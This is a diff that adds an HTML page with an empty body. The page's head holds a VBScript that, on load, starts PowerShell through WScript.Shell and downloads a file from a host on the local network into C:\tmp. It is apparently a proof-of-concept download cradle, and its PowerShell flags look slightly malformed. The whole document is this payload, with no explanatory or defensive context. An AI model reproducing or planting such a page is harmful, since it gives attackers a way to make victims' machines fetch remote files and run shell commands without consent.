@@ -1,0 +1,10 @@
+<HTML> 
+<HEAD> 
+<script language="VBScript">
+    Set objShell = CreateObject("Wscript.Shell")
+    objShell.Run "powershell -nop -exec -c (New-Object Net.WebClient).DownloadFile('http://192.168.0.168:8000/HelloWorld','C:\tmp\HelloWorld.txt')"
+</script>
+</HEAD> 
+<BODY> 
+</BODY> 
+</HTML>
